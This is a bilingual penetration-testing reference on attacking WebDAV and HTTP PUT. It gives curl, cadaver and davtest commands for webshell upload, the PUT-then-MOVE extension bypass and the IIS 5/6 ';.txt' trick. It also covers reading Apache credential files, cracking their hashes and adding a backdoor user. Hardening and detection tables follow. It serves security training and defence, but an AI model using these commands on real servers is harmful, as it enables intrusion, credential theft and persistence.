---
attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 注入类
impact:
  - 远程代码执行
  - 完整性破坏
  - 权限提升
risk_level: 高
prerequisites:
  - HTTP Methods (PUT, MOVE, DELETE, PROPFIND)
  - HTTP Basic/Digest Authentication
  - WebShell fundamentals
related_techniques:
  - file-upload
  - brute-force
  - waf-bypass
  - credential-harvesting
difficulty: 初级
tools:
  - davtest
  - cadaver
  - curl
  - hydra
---

# WebDAV & PUT Method — HTTP Write Access Attack Surface — WebDAV 与 PUT 方法攻击面分析

> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [Brute Force](../../../Other%20Helpful%20Vulnerabilities/../../../generic-hacking/brute-force.md) · [IIS Security](../IIS/README.md) · [Apache Security](../Apache/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md)

---

### 知识路径

```
WebDAV & PUT Method (this document)
  ├── Prerequisite: HTTP Methods — PUT, MOVE, DELETE, PROPFIND, OPTIONS
  ├── Prerequisite: HTTP Authentication — Basic, Digest
  ├── Next: IIS 6.0 WebDAV Parsing Bypass (;.txt suffix)
  │   └── See: Web Servers & Middleware/IIS
  ├── Next: POST-exploitation → credential harvesting in Apache configs
  ├── Related: File Upload — general upload exploitation
  │   └── See: Files/File Upload
  ├── Related: Brute Force — WebDAV credential attacks
  │   └── See: generic-hacking/brute-force
  └── Related: WAF Bypass — extension filter evasion
      └── See: Proxies/Proxy & WAF Protections Bypass
```

---

# 0x01 WebDAV & PUT Method — Principles & Classification

## 1.1 HTTP Methods & WebDAV Architecture

WebDAV (Web Distributed Authoring and Versioning) extends HTTP/1.1 with methods for distributed file management. When enabled on a web server, it allows authenticated clients to **create, modify, move, and delete** files on the server via standard HTTP verbs.

**WebDAV-specific HTTP methods:**

| Method | Purpose | Attack Relevance |
|--------|---------|-----------------|
| `PUT` | Upload/create a file at the specified path | Direct webshell upload |
| `MOVE` | Rename or relocate an existing file | Bypass upload extension filters |
| `DELETE` | Remove a file | Defacement, anti-forensics |
| `PROPFIND` | Retrieve resource properties | Directory listing, information disclosure |
| `OPTIONS` | Discover supported methods | Reconnaissance — reveals WebDAV presence |
| `COPY` | Duplicate a file to a new path | Bypass upload restrictions via copy+rename |
| `MKCOL` | Create a directory | Create writable directories for staging |

**Server implementations:**

| Server | WebDAV Module | Auth Type |
|--------|-------------|-----------|
| Apache httpd | `mod_dav` + `mod_dav_fs` | Digest (default), Basic |
| IIS 5.0/6.0 | Native WebDAV | Windows Integrated, Basic |
| IIS 7.0+ | WebDAV Extension Module | Windows Auth, Basic |
| Nginx | Third-party (`nginx-dav-ext-module`) | Basic |

## 1.2 Attack Surface Taxonomy

| Category | Taxonomy | Techniques |
|----------|----------|------------|
| Configuration Weakness | 配置缺陷 | WebDAV enabled without necessity; writable permissions on webroot; no IP restriction |
| Authentication/Authorization Bypass | 认证/授权绕过 | Default/weak credentials; brute-force; PUT without auth on misconfigured servers |
| Parsing Discrepancy | 协议解析差异 | IIS 5/6 `;.txt` suffix bypass — extension filter sees `.txt`, IIS parser executes `.asp` |
| Injection | 注入类 | Webshell upload via PUT → RCE; MOVE rename to executable extension → code execution |

---

# 0x02 Reconnaissance & Exploitation Tooling

## 2.1 DavTest — Automated Extension Testing

**Davtest** attempts to upload files with various extensions, then checks which extensions are executable on the server:

```bash
# Upload .txt files and attempt to MOVE them to executable extensions
davtest [-auth user:password] -move -sendbd auto -url http://<IP>

# Try to directly upload every known extension
davtest [-auth user:password] -sendbd auto -url http://<IP>
```

**Output interpretation:**

[图片: DavTest output — Qwen extracted. Shows davtest against 10.11.1.229: server-side scripts (.jsp, .php, .cfm, .pl) all FAIL execution; .txt and .html SUCCEED as accessible files. Tool uploads files then checks if they execute — FAIL = server rejects code execution (good), SUCCEED = file accessible via web (not necessarily executed). Confirms warning: DavTest "SUCCEED" ≠ server-side code execution.]

> **Warning:** DavTest reporting an extension as "successful" only means the file is **accessible** through the web server — it does **not** guarantee server-side execution. Always manually verify by accessing the uploaded file and checking for code execution.

## 2.2 Cadaver — Interactive WebDAV Client

**Cadaver** provides an interactive command-line interface for WebDAV operations:

```
cadaver <IP>
```

Supports manual upload (`put`), move (`move`), delete (`delete`), and directory listing (`ls`) operations against the WebDAV server. Useful for step-by-step exploitation where automated tools are blocked or rate-limited.

## 2.3 Raw HTTP with curl

### 2.3.1 PUT — Direct File Upload

```bash
curl -T 'shell.txt' 'http://$ip'
```

The `-T` flag sends a PUT request with the file content. The target path must be writable and the method must be enabled.

### 2.3.2 MOVE — Rename to Executable Extension

```bash
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```

Upload a non-executable file (`.txt`) via PUT, then MOVE it to an executable extension (`.php`, `.asp`, `.aspx`, `.jsp`). This bypasses upload filters that check the extension of PUT-requested files.

---

# 0x03 Exploitation Techniques

## 3.1 Direct PUT Upload → Webshell

### 3.1.1 Mechanism

If the server has WebDAV enabled with write permissions and the target directory allows execution of uploaded file types, a webshell can be uploaded directly:

```bash
# Check if PUT is allowed
curl -X OPTIONS http://$ip/ -I

# Upload a simple PHP webshell
curl -T 'shell.php' 'http://$ip/shell.php'

# Upload an ASPX webshell
curl -T 'shell.aspx' 'http://$ip/shell.aspx'
```

### 3.1.2 Conditions

- WebDAV enabled with write permissions on the target directory
- Valid credentials (if authentication is required)
- Target extension is allowed for upload and executed by the server
- Directory is web-accessible

## 3.2 MOVE Rename Bypass

### 3.2.1 Mechanism

When the server blocks direct upload of executable extensions (`.php`, `.asp`, `.aspx`) but allows non-executable ones (`.txt`, `.html`), a two-step bypass works:

1. **PUT** a webshell with a benign extension (`.txt`)
2. **MOVE** the uploaded file to an executable extension (`.php`)

```bash
# Step 1: Upload webshell as .txt
curl -T 'shell.php' 'http://$ip/shell.txt'

# Step 2: Rename to executable extension
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```

### 3.2.2 Cadaver Equivalent

```
cadaver <IP>
> put shell.txt
> move shell.txt shell.php
```

## 3.3 IIS 5/6 WebDAV — `;.txt` Parsing Bypass

### 3.3.1 Mechanism

IIS 5.0 and 6.0 WebDAV implementations have a **parsing flaw**: the upload filter blocks files ending with `.asp`, but adding `;.txt` (or `;.html`) as a **suffix** causes the filter to see `.txt` while the IIS parser sees `.asp`:

```
filename.asp;.txt  →  upload filter: allowed (.txt extension)
                   →  IIS parser:     executed as ASP (.asp before semicolon)
```

### 3.3.2 Exploitation Steps

1. Upload the ASP webshell as `shell.asp;.txt` via PUT
2. Or: upload as `shell.txt` → MOVE to `shell.asp;.txt`
3. Access via browser: `http://target/shell.asp;.txt`

[图片: IIS5/6 WebDAV cadaver exploitation — Qwen extracted. Shows full IIS semicolon bypass attack: (1) `put reverse.txt` succeeds uploading raw webshell, (2) `copy reverse.txt reverse.asp;.txt` succeeds — the `;.txt` suffix bypasses IIS extension filter (server sees `.txt`, parser executes as `.asp`), (3) `move reverse.txt reverse2.asp;.txt` fails with 401 Unauthorized but `ls` confirms `reverse2.asp;.txt` EXISTS — validates source note that cadaver reports failure incorrectly, (4) background window shows `nc -lvnp 80` receiving a connection and `whoami` returning `nt authority\system` — successful shell on a separate target.]

> **Note:** Cadaver may report that the MOVE action did not work — **ignore this**. The file is moved successfully on the server side despite the client-side error message. Verify by accessing the file URL directly.

### 3.3.3 Conditions

- IIS 5.0 or 6.0 (the parsing bug is fixed in IIS 7.0+)
- WebDAV enabled
- Valid credentials with write access
- ASP is enabled as a server-side script handler

This vulnerability is also documented in [IIS Security](../IIS/README.md) §4.4 (IIS 6.0 Parsing-Based Access Bypass) and relates to the same semicolon parsing behavior that enables [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) in mixed IIS + proxy deployments.

---

# 0x04 Post-Exploitation & Credential Harvesting

## 4.1 Apache WebDAV Configuration Extraction

### 4.1.1 Locating WebDAV Configuration

After gaining shell access on an Apache server with WebDAV, check site configurations:

```bash
# Debian/Ubuntu
cat /etc/apache2/sites-enabled/000-default

# RHEL/CentOS
cat /etc/httpd/conf.d/webdav.conf
```

### 4.1.2 Configuration Analysis

Typical WebDAV configuration block:

```
ServerAdmin webmaster@localhost
        Alias /webdav /var/www/webdav
        <Directory /var/www/webdav>
                DAV On
                AuthType Digest
                AuthName "webdav"
                AuthUserFile /etc/apache2/users.password
                Require valid-user
```

### 4.1.3 Credential File Extraction

The `AuthUserFile` directive points to the credentials file:

```
/etc/apache2/users.password
```

This file contains **usernames** and **password hashes** for WebDAV authentication. Extract and crack them:

```bash
# View credentials file
cat /etc/apache2/users.password

# Example format: username:realm:hash
# Crack with hashcat (mode depends on AuthType):
#   Digest: hashcat -m 1600
#   Basic:  hashcat -m 0 (if htpasswd with MD5/APR1/Bcrypt)

# Add a new WebDAV user (backdoor persistence)
htpasswd /etc/apache2/users.password <USERNAME>  # Prompts for password
```

### 4.1.4 Verify New Credentials

```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```

---

# 0x05 Defense, Hardening & Tools

## 5.1 Hardening Checklist

| Action | Rationale |
|--------|-----------|
| Disable WebDAV if not required (`DAV Off` in Apache; remove WebDAV role in IIS) | Eliminates entire attack surface |
| Restrict WebDAV to authenticated users only (`Require valid-user`) | Prevents anonymous write access |
| Use strong, unique passwords; enforce account lockout after N failed attempts | Mitigates brute-force attacks |
| Restrict writable directories to non-executable locations | Even if webshell is uploaded, it cannot execute |
| Set `LimitRequestBody` and `LimitXMLRequestBody` to reasonable values | Prevents large file uploads / DoS |
| Restrict file extensions: only allow `.txt`, `.pdf`, `.doc` — never `.php`, `.asp`, `.jsp` | Prevents executable webshell upload |
| Use IP whitelisting for WebDAV access (`Allow from` / `Require ip`) | Limits exposure to trusted networks |
| Audit `AuthUserFile` permissions: `chmod 640`, owned by root | Prevents credential file read by web server user |
| Monitor PUT/MOVE/DELETE requests in access logs | Detects exploitation in progress |
| Apply IIS patches: the IIS 5/6 `;.txt` bypass is not present in IIS 7.0+ | Version upgrade eliminates parsing bug |

## 5.2 Detection Telemetry

| Indicator | Significance |
|-----------|--------------|
| `OPTIONS` request returning `PUT, MOVE, DELETE, PROPFIND` | WebDAV reconnaissance |
| `PUT` request with `.txt` extension followed by `MOVE` to `.php`/`.asp` | Two-step extension bypass |
| `PUT` request with filename containing `;.txt` or `;.html` | IIS 5/6 WebDAV bypass |
| Multiple failed `PUT` attempts with different credentials | Credential brute-force |
| New files appearing in webroot outside deployment window | Successful webshell upload |
| Access to `/etc/apache2/users.password` from web server process | Credential theft |

## 5.3 Tools Inventory

| Tool | Purpose | Reference |
|------|---------|-----------|
| `davtest` | Automated WebDAV extension testing | Built-in Kali |
| `cadaver` | Interactive WebDAV client | Built-in Kali |
| `curl` | Raw HTTP PUT/MOVE/DELETE | Built-in |
| `hydra` | WebDAV credential brute-force | Built-in Kali |
| `htpasswd` | Apache credential file manipulation | Built-in |

## 参考资料

- [vk9-sec — Exploiting WebDAV](https://vk9-sec.com/exploiting-webdav/)
- [HackTricks — WebDAV](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
- [Apache mod_dav Documentation](https://httpd.apache.org/docs/2.4/mod/mod_dav.html)
- [Microsoft IIS WebDAV Extension](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/)
